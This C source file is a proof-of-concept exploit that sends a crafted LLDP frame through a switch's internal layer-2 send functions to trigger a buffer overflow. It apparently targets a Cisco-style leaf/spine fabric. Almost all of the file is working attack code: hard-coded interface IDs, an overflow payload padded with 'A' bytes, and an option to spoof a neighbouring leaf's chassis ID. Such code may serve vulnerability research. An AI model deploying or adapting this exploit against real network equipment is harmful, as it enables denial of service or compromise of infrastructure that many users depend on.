#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int net_l2_register(int*, int, int*, int*, int, int);
int net_l2_send(int, int*, int*, char*, int, char*);
int zc_init(void);

int main(int argc, char** argv)
{
  // choose the target interface
  int if_id_index = 0;
  int use_leaf2_chassis_id = 0;

  if (argc >= 2){
      if_id_index = atoi(argv[1]);

      if (argc >= 3){
          use_leaf2_chassis_id = 1;
      }
  }

  int x;
  int payload_length = 49;
  int l2_message_length = payload_length + 14;
  int socket_fd;

  struct ethertype_struct{
      int type;
      char padding[64];
  };
  
  struct ethertype_struct ethertype;

  // is normally set but doesn't seem to have an effect
  ethertype.type = 0x0800;
  memset(ethertype.padding, 0, 64);
  int a3 = 1;
  printf("[.] Calling net_l2_register ...\n");
  x = net_l2_register(&socket_fd, 1, &a3, &ethertype.type, 1, 0);
  printf("[.] The net_l2_register return value is %x\n", x);

  int a2 = 0;

  // This struct mainly holds the interface ID (in the member if_id),
  // on which the packets should be sent out.
  struct interface{
    int if_id;
    char padding[12];
    // iod_flood is actually a 4byte integer and at if_id + 19;
    // using a padding of size 15 doesn't work as the compiler does alignment, so we use this ugly workaround
    char iod_flood[8];
    char padding2[16];
  };

  struct l2_frame_struct{
    // layer 2 src/dst address
    char dst_address[6];
    char src_address[6];
    // the effective eth.type
    char ethertype[2];
    // this field holds everything above layer 2
    char msg[payload_length];
  };

  struct padding_struct{
    char padding[64];
  };

  struct interface intf;
  struct l2_frame_struct l2_frame;
  struct padding_struct pstruct;

  // ugly workaround; see defintion of interface struct
  int* iod_flood = (int *)((char *)&intf.iod_flood + 3);
  *iod_flood = 0x22;

  // 0x1a013000: from leaf1 to host1
  // 0x1a035000: leaf1 to spine
  int if_id_array[2] = {0x1a013000, 0x1a035000};
  intf.if_id = if_id_array[if_id_index];

  char lldp_multicast_address[6] = "\x01\x80\xc2\x00\x00\x0e";
  // 0x88cc == LLDP
  strncpy(l2_frame.ethertype, "\x88\xcc", 2);
  memcpy(l2_frame.dst_address, lldp_multicast_address, 6);
  char src_address[6] = "\x00\x01\x02\x03\x04\x05";
  memcpy(l2_frame.src_address, src_address, 6);

  // The shortest possible LLDP packet we came up with, which will trigger the Buffer Overflow
  // It only consists of the Chassis ID, Port Subtype, Time To Live and Cisco's Subtype 0xd8
  char payload[49] = "\x02\x07\x04\x12\x34\x56\x78\x00\x11\x04\x08\x07\x45\x74\x68\x31\x2f\x35\x34\x06\x02\x00\x78\xfe\x16\x00\x01\x42\xd8\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00";

  if (use_leaf2_chassis_id){
    char* chassis_id = payload + 3;
    printf("[.] Changing Chassis ID to Leaf2.\n");
    // adjust this ID with the MAC address of the Leaf switche's sending interface
    strncpy(chassis_id, "\x12\x34\x56\x78\x00\x12", 6);
  }

  memcpy(l2_frame.msg, payload, payload_length);

  printf("[.] Sending LLDP packet on interface id: %x\n", intf.if_id);
  net_l2_send(socket_fd, &a2, &intf.if_id, pstruct.padding, l2_message_length, l2_frame.dst_address);
  printf("[.] The return value for net_l2_send is %d\n", x);

  return 0;
}
